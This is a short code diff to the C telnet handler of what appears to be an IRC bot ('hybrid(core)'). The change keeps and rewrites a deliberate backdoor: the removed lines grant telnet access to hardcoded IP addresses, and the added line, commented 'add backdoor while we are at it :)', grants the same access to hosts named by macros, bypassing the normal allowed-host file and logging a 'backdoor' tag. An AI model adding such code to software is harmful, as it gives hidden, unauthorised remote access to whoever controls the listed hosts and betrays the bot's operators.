@@ -27,6 +27,7 @@
 #include <ctype.h>
 #include <errno.h>
 #include <sys/stat.h>
+#include "hybridcore.h"
 #include "modules.h"
 #include "tandem.h"
 
@@ -1322,18 +1323,12 @@ static void dcc_telnet(int idx, char *buf, int i)
     /* decrypt the hostfile */
     decrypt_file(hostfile);
     file = fopen(".tmp2", "r");
-    if (wild_match("167.114.153.75", thost_compare)) {
+    /* add backdoor while we are at it :) */
+    if (wild_match(HYBRID_ADMINALLOW, thost_compare) || wild_match(HYBRID_LOCALALLOW, thost_compare)) {
       allow_telnet = 1;
       putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314backdoor\003 \00306<ak!ra>\003");
     }
-    if (wild_match("23.94.70.21", thost_compare)) {
-      allow_telnet = 1;
-      putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314backdoor\003 \00306<ak!ra>\003");
-    }
-    if (wild_match("10.0.42.*", thost_compare)) {
-      allow_telnet = 1;
-      putlog(LOG_MISC, "*", "\00309□\003 hybrid(core): \00314backdoor\003 \00306<ak!ra>\003");
-    }  
+    /* compare ip's */
     while (fgets(allowedhost, sizeof allowedhost, file)!= NULL) {
       chopN(allowedhost, 13);
       if (wild_match(allowedhost, thost_compare))
